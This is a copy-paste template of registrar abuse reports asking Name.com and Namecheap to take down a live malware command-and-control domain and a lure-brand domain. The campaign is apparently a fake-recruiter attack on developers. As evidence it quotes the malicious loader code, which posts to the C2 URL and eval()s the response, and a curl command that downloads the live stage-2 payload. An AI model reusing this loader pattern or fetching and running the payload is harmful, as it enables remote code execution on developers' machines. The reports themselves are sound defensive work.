# Abuse reports — domain registrars

Two registrar abuse filings are appropriate for the realfraction-family generation:

- **Name.com** — to revoke `isillegalregion.com`, the **live** loader-C2 apex domain currently serving stage-2 JavaScript payloads.
- **Namecheap** — to revoke `realfraction.xyz`, the lure-brand domain backing the `realfraction` GitHub org's contact email.

A third registrar (Unstoppable Domains, for `ipregionchecker.com`) is **not** filed against here because the apex is already on `client hold` status — the registrar appears to have already actioned this domain following an earlier abuse report.

This file is a **copy-paste template**. Both filings use the same evidentiary body with registrar-specific submission targets.

### Placeholders to fill in

| Placeholder | What to put |
|---|---|
| `[your name / handle]` | How you want the "Reported by" line to read |

(There are no per-filer or per-repo placeholders in the registrar bodies — they're entirely cluster-wide.)

---

## Filing checklist

| # | Target domain | Registrar | Submission target | Subject + body |
|---|---|---|---|---|
| 1 | `isillegalregion.com` | **Name.com Inc.** | Email: **abuse@name.com** · Web: https://www.name.com/abuse-policy | [Name.com filing](#namecom-filing) — primary; the live C2 |
| 2 | `realfraction.xyz` | **Namecheap** | Email: **abuse@namecheap.com** · Web: https://www.namecheap.com/legal/abuse-reports/abuse-policy/ | [Namecheap filing](#namecheap-filing) — lure-brand domain |

---

## Name.com filing

(For Filing #1 — registrar takedown of the live C2 domain.)

### Subject

```text
Active developer-targeting malware C2 — domain isillegalregion.com serving live stage-2 JavaScript payload
```

### Body

```text
SUMMARY

I am reporting the domain `isillegalregion.com`, registered through Name.com, as actively serving as a command-and-control server in a multi-repository developer-targeting malware campaign. The domain's www subdomain is currently returning a ~2.85 MB obfuscated JavaScript stage-2 payload on a documented endpoint when probed with a magic header that no legitimate application uses.

This filing requests that Name.com revoke the domain's registration under the registrar's prohibition on hosting infrastructure that distributes malware.

DOMAIN DETAILS

  Domain:         isillegalregion.com
  Registration:   2026-02-13 (per RDAP)
  Registrar:      Name.com Inc.
  Nameservers:    ns1.vercel-dns.com, ns2.vercel-dns.com  (DNS hosted on Vercel)
  IPv4:           64.29.17.65, 216.198.79.1  (Vercel edge)

EVIDENCE OF MALICIOUS USE

The full URL https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39 is hardcoded into the loader file `server/controllers/paymentController.js` of the malicious GitHub repository:

  https://github.com/slobodanmargetic988/real-world-assets/blob/main/server/controllers/paymentController.js

The relevant code excerpt:

  const regionCheckApi = 'https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39';
  const check = https.request(regionCheckApi, { method: 'POST', headers: { 'x-secret-header': 'secret' } }, (res) => {
    let data = '';
    res.on('data', (chunk) => { data += chunk; });
    res.on('end', () => {
      if (data === 'blocked') return;
      try { if (JSON.parse(data)?.blocked) return; } catch (e) { }
      try { eval(data); } catch (e) { console.error('Region check failed:', e); }
    });
  });

This POSTs to your customer's domain with a magic header `x-secret-header: secret` and `eval()`s the response body — i.e., the response body is executed as JavaScript with full Node.js scope (the loader has access to `require`, `process`, `child_process`, etc.). This is full RCE on any developer's machine that runs the repository.

REPRODUCIBLE PROBE — returns the full payload from any IP

  $ curl -sS -D - -o /tmp/payload.bin -X POST \
        -H 'x-secret-header: secret' --max-time 20 \
        'https://www.isillegalregion.com/api/ip-check-encrypted/3aeb34a39'

Expected response on 2026-05-18:

  HTTP/2 200
  content-type: text/html; charset=utf-8
  server: Vercel
  content-length: 2914396  (i.e., ~2.85 MB)

Payload SHA-256: dbd065a1e8d525acf81428bf131240e7ffd2913538052387f83fe3df83659ee0

Payload structure: single-line obfuscator.io-style obfuscated JavaScript with object-property obfuscation (e.g., function iT(g,J,A,T,u){const lk={g:0x228};return l(u-lk.g,T);}), hex-constant key obfuscation, and string-table indirection. This obfuscation style is exclusively used by stealer / loader malware; it is entirely inconsistent with a legitimate web-application response body.

CAMPAIGN CONTEXT

This domain is part of the publicly documented "Contagious Interview" / Famous Chollima developer-targeting cluster (fake recruiter → clone GitHub repo → npm install/start → stealer-loader). Public reporting on the broader cluster:

  - Microsoft Threat Intelligence — "Contagious Interview"
  - Trend Micro — "Void Dokkaebi"
  - ReversingLabs — fake-recruiter coding-tests writeup

The specific realfraction-family generation of this cluster (which uses the `x-secret-header: secret` magic header) spans at least 27 confirmed GitHub repositories across multiple organizations and individual user accounts. Full case file:

  https://github.com/bryanchriswhite/dev-trap-dossiers/tree/main/incidents/2026-05-18-realfraction

PARALLEL FILINGS

  - GitHub Trust & Safety has been filed against the repositories referencing this domain and against the operator-owned organizations hosting them.
  - Vercel abuse has been filed against the Vercel deployment serving this domain (and against two sibling Vercel deployments that Vercel has already DEPLOYMENT_DISABLED — cookie-xi-seven.vercel.app and ip-check-api.vercel.app — which is itself prior corroborating action against this cluster's infrastructure).

REQUESTED ACTION

Revoke / suspend the `isillegalregion.com` domain registration under Name.com's prohibition on use of domain names for distributing malware (https://www.name.com/abuse-policy). If preferred, place the domain on `client hold` to halt resolution while the registrant is contacted; this is the action that has already been taken by Unstoppable Domains against the related domain `ipregionchecker.com` (registrar-level `client hold` set 2026-05-07).

Reported by: [your name / handle]
Date: <today's date>
```

---

## Namecheap filing

(For Filing #2 — registrar takedown of the lure-brand domain.)

### Subject

```text
Lure-brand domain backing a developer-targeting malware campaign — realfraction.xyz
```

### Body

```text
SUMMARY

I am reporting the domain `realfraction.xyz`, registered through Namecheap, as the lure-brand identity domain backing a single-purpose GitHub organization (`realfraction`) that hosts active developer-targeting malware. The domain's only operational use is to back the contact email `hello@realfraction.xyz` on the operator-controlled GitHub organization's public profile, providing a plausible-looking corporate identity for the campaign's "Web3 real-estate platform" lure framing.

DOMAIN DETAILS

  Domain:         realfraction.xyz
  Registration:   2026-05-09 (per RDAP)
  Registrar:      Namecheap (Identity Digital handle 1068)
  Nameservers:    dns1.registrar-servers.com, dns2.registrar-servers.com  (Namecheap default)
  IPv4:           162.255.119.72  (Namecheap parking IP)

EVIDENCE OF USE AS LURE INFRASTRUCTURE

The domain is the contact email's parent domain on the GitHub organization profile that hosts the malicious repository:

  https://github.com/realfraction  (contact email: hello@realfraction.xyz)
  https://github.com/realfraction/realfraction  (the malicious repository itself)

The organization is single-repo and single-purpose. It exists exclusively to host the malicious repository `realfraction/realfraction`, which contains a Node.js loader at `server/utils/regionChecker.js` that, at Express server startup, POSTs to `https://www.ipregionchecker.com/api/ip-check-encrypted/3aeb34a31` with header `x-secret-header: secret` and `eval()`s the response — full RCE on the developer's machine. (The `www.ipregionchecker.com` C2 apex is itself currently registrar-frozen by Unstoppable Domains; a sibling C2 `www.isillegalregion.com` is the active replacement and is being filed against separately at its registrar Name.com.)

The `realfraction.xyz` domain's only role in the campaign is to back the lure-brand contact email; without it, the malicious GitHub org has no identity hook to anchor its claim to be a real "blockchain real-estate platform."

CAMPAIGN CONTEXT

The malicious repository is part of the publicly documented "Contagious Interview" / Famous Chollima developer-targeting cluster (Microsoft, Trend Micro, ReversingLabs reporting). Full case file:

  https://github.com/bryanchriswhite/dev-trap-dossiers/tree/main/incidents/2026-05-18-realfraction

The lure-brand domain itself is registered through Namecheap in violation of Namecheap's Acceptable Use Policy provisions against the registration of domain names used to "deceive others into thinking they're dealing with a legitimate company" (paraphrased from https://www.namecheap.com/legal/abuse-reports/abuse-policy/).

REQUESTED ACTION

Suspend the `realfraction.xyz` domain registration under Namecheap's Acceptable Use Policy. Once revoked, the operator can no longer credibly anchor the malicious GitHub organization's contact identity to a `realfraction.xyz` email.

Reported by: [your name / handle]
Date: <today's date>
```

---

## Supporting artifacts (for your reference; do not paste these into the tickets)

- Full technical analysis: [`README.md`](./README.md)
- IOCs in machine-readable form: [`iocs.csv`](./iocs.csv), [`iocs.json`](./iocs.json)
- Companion abuse reports: [`abuse-report-github.md`](./abuse-report-github.md), [`abuse-report-vercel.md`](./abuse-report-vercel.md)
